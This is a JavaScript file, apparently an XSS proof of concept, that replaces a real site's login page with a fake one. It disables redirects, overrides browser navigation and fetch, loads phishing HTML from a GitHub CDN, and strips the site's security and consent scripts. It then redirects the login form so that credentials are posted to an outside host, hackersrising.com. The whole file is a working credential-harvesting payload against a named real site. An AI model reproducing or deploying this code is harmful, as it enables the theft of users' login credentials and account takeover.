// fakelogin.js - Aggressive no-redirect version

(function() {
    'use strict';

    // === BLOCK REDIRECTS EARLY ===
    window.location = { href: location.href, assign: () => {}, replace: () => {}, reload: () => {} };
    Object.defineProperty(window, 'location', {
        value: { href: '/gpapi/oauth/login', assign: () => {}, replace: () => {}, reload: () => {} },
        writable: false
    });

    history.pushState = history.replaceState = () => {};
    window.open = () => null;

    // Kill common redirect methods
    const originalFetch = window.fetch;
    window.fetch = function(url) {
        if (typeof url === 'string' && (url.includes('redirect') || url.includes('login'))) {
            return Promise.resolve({ ok: true, text: () => Promise.resolve('') });
        }
        return originalFetch.apply(this, arguments);
    };

    // Load the fake page
    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
        .then(r => r.text())
        .then(html => {
            document.documentElement.innerHTML = html;

            setTimeout(() => {
                killRedirectScripts();
                fixResources();
                forceFormAction();
                console.log('%c[PoC SUCCESS] Fake login loaded - Redirects blocked', 'color: lime; font-size: 18px; font-weight: bold');
            }, 400);
        })
        .catch(e => console.error(e));
})();

function killRedirectScripts() {
    // Remove dangerous scripts that likely cause redirect
    document.querySelectorAll('script').forEach(s => {
        const src = s.getAttribute('src') || s.textContent || '';
        if (src.includes('gpapi.bundle') || 
            src.includes('gtm.js') || 
            src.includes('analytics') || 
            src.includes('securiti') || 
            src.includes('cookie-consent') ||
            src.includes('trustarc') ||
            src.includes('_Incapsula')) {
            s.remove();
        }
    });

    // Also remove inline scripts that might redirect
    const inlineScripts = document.querySelectorAll('script:not([src])');
    inlineScripts.forEach(s => {
        if (s.textContent.includes('location') || 
            s.textContent.includes('redirect') || 
            s.textContent.includes('window.open')) {
            s.remove();
        }
    });
}

function fixResources() {
    const base = 'https://www.gssiweb.org/GPAPI/dist/lib/';

    document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
        let h = link.href || link.getAttribute('href') || '';
        if (h && !h.startsWith('http')) {
            const name = h.split('/').pop().split('?')[0];
            link.href = base + name;
        }
    });

    document.querySelectorAll('script[src]').forEach(script => {
        let s = script.getAttribute('src') || '';
        if (s && !s.startsWith('http') && !s.includes('hackersrising')) {
            const name = s.split('/').pop().split('?')[0];
            script.src = base + name;
        }
    });

    document.querySelectorAll('img').forEach(img => {
        let s = img.src || '';
        if (s && !s.startsWith('http')) {
            img.src = base + s.split('/').pop();
        }
    });
}

function forceFormAction() {
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
        form.method = 'post';
    }
}
